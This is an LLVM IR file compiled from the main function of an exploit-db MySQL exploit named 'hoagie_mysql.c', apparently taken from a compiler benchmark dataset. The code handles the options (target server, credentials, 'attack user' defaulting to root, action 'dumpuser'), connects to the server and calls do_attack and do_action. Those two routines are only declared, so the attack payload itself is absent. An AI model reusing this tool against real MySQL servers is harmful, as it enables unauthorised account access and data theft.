; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22084.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22084.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [12 x i8] c"ht:u:p:a:e:\00", align 1
@EOF = common dso_local global i8 0, align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"hoagie_mysql.c\0A\00", align 1
@.str.2 = private unnamed_addr constant [41 x i8] c"-t ... mysql server (default localhost)\0A\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"-u ... username (default empty)\0A\00", align 1
@.str.4 = private unnamed_addr constant [33 x i8] c"-p ... password (default empty)\0A\00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"-a ... attack user (default root)\0A\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c"-e ... action\0A\00", align 1
@.str.7 = private unnamed_addr constant [20 x i8] c"-h ... this screen\0A\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@.str.9 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"root\00", align 1
@.str.11 = private unnamed_addr constant [9 x i8] c"dumpuser\00", align 1
@.str.12 = private unnamed_addr constant [32 x i8] c"connecting to [%s] as [%s] ... \00", align 1
@stdin = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"failed\0A\00", align 1
@.str.14 = private unnamed_addr constant [4 x i8] c"ok\0A\00", align 1
@.str.15 = private unnamed_addr constant [47 x i8] c"sending one byte requests with user [%s] ... \0A\00", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"attack failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %11, align 8
  store i8* null, i8** %12, align 8
  store i8* null, i8** %10, align 8
  store i8* null, i8** %9, align 8
  store i8* null, i8** %8, align 8
  br label %13

13:                                               ; preds = %43, %2
  %14 = load i32, i32* %4, align 4
  %15 = load i8**, i8*** %5, align 8
  %16 = call signext i8 @getopt(i32 %14, i8** %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))
  store i8 %16, i8* %7, align 1
  %17 = sext i8 %16 to i32
  %18 = load i8, i8* @EOF, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp ne i32 %17, %19
  br i1 %20, label %21, label %44

21:                                               ; preds = %13
  %22 = load i8, i8* %7, align 1
  %23 = sext i8 %22 to i32
  switch i32 %23, label %43 [
    i32 104, label %24
    i32 116, label %33
    i32 117, label %35
    i32 112, label %37
    i32 97, label %39
    i32 101, label %41
  ]

24:                                               ; preds = %21
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.2, i64 0, i64 0))
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.4, i64 0, i64 0))
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0))
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.7, i64 0, i64 0))
  %32 = call i32 @exit(i32 0) #3
  unreachable

33:                                               ; preds = %21
  %34 = load i8*, i8** @optarg, align 8
  store i8* %34, i8** %8, align 8
  br label %43

35:                                               ; preds = %21
  %36 = load i8*, i8** @optarg, align 8
  store i8* %36, i8** %9, align 8
  br label %43

37:                                               ; preds = %21
  %38 = load i8*, i8** @optarg, align 8
  store i8* %38, i8** %10, align 8
  br label %43

39:                                               ; preds = %21
  %40 = load i8*, i8** @optarg, align 8
  store i8* %40, i8** %11, align 8
  br label %43

41:                                               ; preds = %21
  %42 = load i8*, i8** @optarg, align 8
  store i8* %42, i8** %12, align 8
  br label %43

43:                                               ; preds = %41, %21, %39, %37, %35, %33
  br label %13

44:                                               ; preds = %13
  %45 = load i8*, i8** %8, align 8
  %46 = icmp ne i8* %45, null
  br i1 %46, label %48, label %47

47:                                               ; preds = %44
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0), i8** %8, align 8
  br label %48

48:                                               ; preds = %47, %44
  %49 = load i8*, i8** %9, align 8
  %50 = icmp ne i8* %49, null
  br i1 %50, label %52, label %51

51:                                               ; preds = %48
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.9, i64 0, i64 0), i8** %9, align 8
  br label %52

52:                                               ; preds = %51, %48
  %53 = load i8*, i8** %10, align 8
  %54 = icmp ne i8* %53, null
  br i1 %54, label %56, label %55

55:                                               ; preds = %52
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.9, i64 0, i64 0), i8** %10, align 8
  br label %56

56:                                               ; preds = %55, %52
  %57 = load i8*, i8** %11, align 8
  %58 = icmp ne i8* %57, null
  br i1 %58, label %60, label %59

59:                                               ; preds = %56
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i8** %11, align 8
  br label %60

60:                                               ; preds = %59, %56
  %61 = load i8*, i8** %12, align 8
  %62 = icmp ne i8* %61, null
  br i1 %62, label %64, label %63

63:                                               ; preds = %60
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i64 0, i64 0), i8** %12, align 8
  br label %64

64:                                               ; preds = %63, %60
  %65 = load i8*, i8** %8, align 8
  %66 = load i8*, i8** %9, align 8
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.12, i64 0, i64 0), i8* %65, i8* %66)
  %68 = load i32, i32* @stdin, align 4
  %69 = call i32 @fflush(i32 %68)
  %70 = load i8*, i8** %8, align 8
  %71 = load i8*, i8** %9, align 8
  %72 = load i8*, i8** %10, align 8
  %73 = call i32 @mysql_connect(i32* %6, i8* %70, i8* %71, i8* %72)
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %77, label %75

75:                                               ; preds = %64
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %93

77:                                               ; preds = %64
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0))
  br label %79

79:                                               ; preds = %77
  %80 = load i8*, i8** %11, align 8
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.15, i64 0, i64 0), i8* %80)
  %82 = load i8*, i8** %11, align 8
  %83 = call i32 @do_attack(i32* %6, i8* %82)
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %89, label %85

85:                                               ; preds = %79
  %86 = load i8*, i8** %12, align 8
  %87 = load i8*, i8** %9, align 8
  %88 = call i32 @do_action(i32* %6, i8* %86, i8* %87)
  br label %91

89:                                               ; preds = %79
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i64 0, i64 0))
  br label %91

91:                                               ; preds = %89, %85
  %92 = call i32 @mysql_close(i32* %6)
  store i32 0, i32* %3, align 4
  br label %93

93:                                               ; preds = %91, %75
  %94 = load i32, i32* %3, align 4
  ret i32 %94
}

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @mysql_connect(i32*, i8*, i8*, i8*) #1

declare dso_local i32 @do_attack(i32*, i8*) #1

declare dso_local i32 @do_action(i32*, i8*, i8*) #1

declare dso_local i32 @mysql_close(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
